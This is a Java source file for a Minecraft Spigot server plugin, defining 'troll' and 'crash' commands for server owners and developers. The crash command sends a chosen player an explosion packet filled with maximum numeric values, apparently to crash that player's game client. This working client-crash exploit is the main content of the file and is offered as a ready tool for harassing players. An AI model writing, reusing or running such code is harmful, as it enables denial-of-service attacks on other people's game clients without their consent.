package de.biomia.spigot.commands.general;

import de.biomia.spigot.Biomia;
import de.biomia.spigot.BiomiaPlayer;
import de.biomia.spigot.commands.BiomiaCommand;
import de.biomia.universal.Messages;
import net.minecraft.server.v1_12_R1.EntityPlayer;
import net.minecraft.server.v1_12_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_12_R1.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_12_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class TrollCommand extends BiomiaCommand {

    public TrollCommand(String name) {
        super(name);
    }

    public void onCommand(CommandSender sender, String label, String[] args) {

        Player p = (Player) sender;
        BiomiaPlayer bp = Biomia.getBiomiaPlayer(p);
        if (!bp.isOwnerOrDev()) {
            sender.sendMessage(Messages.NO_PERM);
            return;
        }

        if (getName().equalsIgnoreCase("troll")) {
            if (bp.isInTrollmode()) {
                bp.setTrollmode(false);
                sender.sendMessage("§cDu bist nun nicht mehr im Trollmodus");
            } else {
                bp.setTrollmode(true);
                sender.sendMessage("§aDu bist nun im Trollmodus");
            }
        } else if (getName().equalsIgnoreCase("crash")) {
            if (args.length >= 1) {
                Player target = Bukkit.getPlayer(args[0]);

                if (bp.isInTrollmode()) {
                    crashPlayer(target);
                    sender.sendMessage("§aDu hast den Spieler§c " + target.getName() + " §agecrashed!");
                } else sender.sendMessage("§cDu bist nicht im Trollmodus!");
            }
        }
    }

    private void crashPlayer(Player p) {
        EntityPlayer nmsPlayer = ((CraftPlayer) p).getHandle();
        PacketPlayOutExplosion packet = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                Float.MAX_VALUE, Collections.emptyList(),
                new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
        nmsPlayer.playerConnection.sendPacket(packet);
    }

}
